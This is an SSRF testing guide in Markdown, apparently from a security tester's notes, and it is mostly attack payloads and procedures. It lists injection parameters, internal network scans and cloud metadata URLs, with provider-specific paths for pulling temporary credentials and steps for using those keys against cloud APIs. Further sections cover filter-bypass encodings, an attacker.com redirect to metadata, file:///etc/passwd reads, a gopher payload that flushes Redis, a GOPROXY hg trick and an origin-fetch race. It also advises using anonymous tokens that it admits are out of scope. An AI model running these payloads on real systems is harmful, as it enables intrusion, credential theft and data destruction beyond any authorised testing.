> Search by heading for “Cloud-provider metadata path differences” and “Public GOPROXY” in the quick matrix. English appendices / additions were removed; cloud metadata path differences and bypasses remain in the first half.

## 1. Existing knowledge base

# SSRF Testing Guide

## Common injection points

```
Image / file URL parameters: imageUrl=, fileUrl=, url=, link=, targetUrl=
Preview / load features: preview=, fetch=, load=, callback=
Webhook: webhook_url=, notify_url=, redirect_url=
PDF / screenshot generation: provide a URL to generate a screenshot
Model / gateway proxy: path contains proxy; parameters may include targetUrl / url / callback
```

## Detection payloads

### Verify with DNSLog (no response body)

```bash
# Obtain a dnslog domain: dnslog.cn / ceye.io / interact.sh
DNSLOG="your-unique-id.dnslog.cn"

# Send the request
curl "https://target.com/api/preview?url=http://$DNSLOG/test"

# Check the DNSLog platform for a DNS query
# A record confirms SSRF
```

### Probe internal services (after confirming SSRF)

```bash
# Probe common internal IP ranges
for ip in 192.168.1.{1..254}; do
  echo "?url=http://$ip"
done

# Probe internal service ports
?url=http://192.168.1.1:6379/   # Redis
?url=http://192.168.1.1:27017/  # MongoDB
?url=http://192.168.1.1:8080/   # Internal web service
?url=http://192.168.1.1:22/     # SSH (infer from response time)
```

### Cloud-service metadata (priority)

```bash
# AWS EC2 metadata (high impact; may expose IAM credentials)
?url=http://169.254.169.254/latest/meta-data/
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Domestic cloud ECS metadata
?url=http://100.100.100.200/latest/meta-data/
?url=http://100.100.100.200/latest/meta-data/ram/security-credentials/

# GCP Metadata
?url=http://metadata.google.internal/computeMetadata/v1/

# Cloud providers (after reaching a directory, obtain the key too; see “Cloud-provider metadata path differences” below)
?url=http://cloud-metadata-host/latest/meta-data/
?url=http://cloud-metadata-host/latest/meta-data/cam/security-credentials/
?url=http://cloud-metadata-host/latest/meta-data/cam/service-role-security-credentials/<ROLE>
?url=http://169.254.169.254/latest/meta-data/
```

### Cloud-provider metadata path differences / loopback blocked but metadata allowed / anonymous cloud-development proxy (quick-matrix pointer)

Recognize: cloud-provider metadata; or a cloud-development / HTTP gateway with `proxy` in the path and `targetUrl` / `url` / `callback` parameters; anonymous login (such as `signin/anonymously`) can obtain a token.

Test:

1. **Filter controls.** First test `http://127.0.0.1/`, then `http://cloud-metadata-host/latest/meta-data/` and `http://169.254.169.254/latest/meta-data/`. A 403 / `Forbidden Loopback` for loopback does not mean metadata is also blocked. If only the loopback string is blocked and the cloud metadata hostname is not filtered by its resolved IP, continue testing.
2. **Credential path.** Once the directory is reachable, read the role name from the list under `cam/security-credentials/`. Then retrieve the temporary key: `cam/security-credentials/role-name` often returns 404, so **also test** `cam/service-role-security-credentials/role-name`. Stopping at 404 by following only the AWS `iam/security-credentials/` pattern misses the key.
3. **Use an anonymous gateway as the entry point.** A token from an official demo environment / anonymous login does **not** count as ordinary authenticated, in-scope access. Use it to test URL parameters on `*proxy*` endpoints. The same endpoint may be disabled in another environment; try another environment rather than treating one disabled instance as proof the whole product is secure.
4. **Open proxy with a fixed POST method.** A direct metadata request returning 405 (IMDS accepts only GET) does not mean there is no issue. First request a public 302 endpoint (such as `redirect-to`) with its Location set to `http://100.100.100.200/latest/meta-data/ram/security-credentials/role`; the proxy may switch to GET while following the redirect. Domestic cloud roles are listed under `ram/security-credentials/`. Use the key with STS GetCallerIdentity.

Confirmed when metadata content is returned, or you obtain `TmpSecretId` / `TmpSecretKey` / `Token` and use them to call a cloud API (such as `GetCallerIdentity`) and identify the main account. If ListBuckets returns 403, continue by signing a CLS `DescribeConfigs` request to inspect collection configuration / topics. An instance-id alone, a key-path 404, or a failed API call is not confirmation.

False positives: the proxy allows only an allowlist of model providers and metadata also returns 403; anonymous login is enabled but the proxy is disabled for anonymous users; the key belongs to a narrow role and you have not shown that it can call any cloud API (partial chain; do not claim full-account takeover). Do not remove this quick-matrix entry because one site did not match.

This does not duplicate the generic “SSRF to `169.254.169.254`” test: it adds **provider-specific credential paths + split filtering between loopback and metadata + an anonymous gateway as the entry point**. Public GOPROXY is a separate test in the next section.

### Public GOPROXY (quick-matrix pointer)

Recognize: a public GOPROXY (`/go/`, module `/@v/list`) requests `?go-get=1` based on the module path and then follows VCS. **This is not** the cloud-development `*proxy*` test above.

Test without logging in:

1. Set the module path to a domain you control.  
2. Set the page `go-import` to **hg** + `http://cloud-metadata-host/...` (git HTTPS often times out).  
3. RFC1918 Forbidden does not mean the metadata hostname is blocked. Once the directory is reachable, retrieve the key from `cam/service-role-security-credentials/role` (same as step 2 above).

Confirmed when hg errors / returns metadata or temporary credentials, then GetCallerIdentity reveals the AccountId.

False positives: it is not GOPROXY / the module path does not trigger `go-get`; the metadata hostname is blocked as well (not only RFC1918); hg does not follow and no key is returned; the key cannot call an API. Do not remove this quick-matrix entry because one site did not match.

## Bypass techniques

```bash
# Bypass an IP blocklist
http://127.0.0.1/    → http://2130706433/       # Decimal IP
                     → http://0177.0.0.1/        # Octal
                     → http://0x7f000001/         # Hexadecimal
                     → http://127.1/             # Shorthand

# Bypass localhost filtering
http://localhost/    → http://[::1]/             # IPv6
                     → http://127.0.0.1.xip.io/ # DNS resolves to 127

# Protocol conversion
http://internal-host/ → file:///etc/passwd
                      → gopher://127.0.0.1:6379/_*1... (target Redis)
                      → dict://127.0.0.1:6379/info

# Bypass with a URL redirect
Set up a redirect service: http://attacker.com/redirect → 302 → http://169.254.169.254/
```

### COS origin-fetch race (test only if origin fetching is observed)

Recognize: the business fetches objects from COS/OSS, the bucket is configured to fetch from an origin you control when an object is missing, and you can PUT and DELETE the **same key**. Do not test without an origin-fetch configuration.

Test:

1. Point the origin to your site and make it return a 302 to metadata or an internal address.  
2. For the same key, send PUT (object exists during the check, so no origin fetch) and DELETE concurrently (object is gone during the real GET → origin fetch follows the 302). For concurrency, see `race-condition-test.md`.  
3. Check whether the business download / import reaches your origin or internal network.

Confirmed when the business request reaches an internal service / metadata (visible in the response, out-of-band, or import result). Proving only that origin fetching can be configured, without reaching an internal service, is not enough.

False positives: the origin does not follow 302; the check and download use the same cache state; you cannot control the origin target. This is not in the quick matrix because it requires control over origin configuration and is narrow.

## Use the gopher protocol to reach internal services

```bash
# Target Redis (write a webshell or scheduled task)
# gopher://127.0.0.1:6379/_ with a RESP-encoded command
?url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A

# Generate a gopher payload with a tool
# gopherus: python gopherus.py --exploit redis
```

---
